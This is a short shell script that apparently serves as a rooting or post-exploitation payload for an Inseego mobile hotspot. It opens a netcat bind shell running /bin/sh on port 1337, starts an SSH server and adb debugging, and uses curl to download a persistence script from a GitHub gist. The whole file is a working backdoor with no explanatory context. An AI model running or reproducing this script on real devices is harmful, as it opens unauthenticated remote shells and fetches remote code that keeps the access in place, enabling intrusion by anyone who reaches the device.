#!/bin/sh

PATH=/bin:/sbin:/usr/bin:/usr/sbin:/opt/nvtl/bin:/opt/nvtl/data/branding/bin

cp /tmp/payload.sh /data/payload.sh

/bin/killall nc

/bin/nc -l -p 1337 -e /bin/sh &

/etc/init.d/dropbear start

/sbin/usb_composition 9085

/bin/killall -9 adbd

/sbin/adbd &

/bin/busybox true

/usr/bin/curl --output /tmp/persistence.sh https://gist.githubusercontent.com/Geofferey/0b1ec30063824e4a5573c9639e98ff99/raw/bf1a355d414e4df2ffe0d3c4b0dc02102bc30f7f/inseego_m2000-peristence.sh

exit 0
